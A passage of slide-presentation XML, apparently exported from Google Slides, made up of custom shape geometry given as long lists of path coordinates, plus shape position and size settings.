                  <a:lnTo>
                    <a:pt x="7373" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7336" y="13170"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10418" y="5613"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11188" y="6714"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="9942"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12288" y="10969"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12288" y="11079"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="11446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="11776"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="11666"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="11666"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11371" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11261" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11371" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="13280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="13353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="13280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="13133"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="13243"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="13500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="13830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9427" y="13867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="13977"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="13390"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="13243"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="13500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7923" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7923" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="13133"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="13170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="14527"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="14527"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6786" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6309" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="13133"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="13390"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="13610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="11776"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="11666"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4805" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="10969"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="10859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="10712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="10639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="10639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="11556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4145" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3888" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4805" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3256" y="10239"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3256" y="10239"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="10272"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3888" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="10052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4365" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5172" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="11556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6896" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7336" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9427" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="11666"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10564" y="9832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="8328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="6494"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="5613"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8400" y="2055"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8290" y="2092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="2459"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6896" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6529" y="3596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="9025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="9832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="11556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="11666"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="11776"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="11666"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="6714"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="5687"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2274" y="5907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1137" y="6604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="6824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="770" y="6824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="660" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="8548"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="9942"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="13500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="14307"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="14710"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="14857"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="14967"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7226" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="14967"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="14820"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="13683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="13170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13169" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="10859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13169" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13095" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="6824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="2092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="2055"/>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21" name="Google Shape;321;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6023725" y="3167900"/>
              <a:ext cx="340250" cy="227450"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="13610" h="9098" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="4696" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4586" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="440"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="1247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
